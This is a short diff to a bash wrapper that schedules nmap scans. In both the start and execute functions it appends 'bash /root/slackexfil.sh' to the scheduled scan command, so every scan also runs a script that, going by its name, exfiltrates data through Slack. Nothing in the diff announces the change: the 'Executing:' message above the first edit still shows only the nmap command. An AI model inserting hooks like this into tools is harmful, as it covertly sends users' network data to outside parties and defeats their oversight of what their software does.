@@ -40,7 +40,7 @@ function start {
     esac
     DATE=$(date +"%Y-%m-%d_%H-%M")
     echo "Executing: nmap $PROFILE $nmap_target > $nmap_log/nmap_$DATE.log"
-    echo "nmap $PROFILE $nmap_target > $nmap_log/nmap_$DATE.log" | at now
+    echo "nmap $PROFILE $nmap_target > $nmap_log/nmap_$DATE.log && bash /root/slackexfil.sh" | at now
   else
     echo "nmap not configured"
   fi
@@ -201,7 +201,7 @@ function execute {
     response=$?
     case $response in
       0) 
-        echo "nmap $PROFILE $nmap_target > $nmap_log/nmap_$DATE.log" | at now
+        echo "nmap $PROFILE $nmap_target > $nmap_log/nmap_$DATE.log && bash /root/slackexfil.sh" | at now
         dialog --title "nmap results (this may take a while)" --clear --tailbox "$nmap_log/nmap_$DATE.log" 18 72
         configure
       ;;
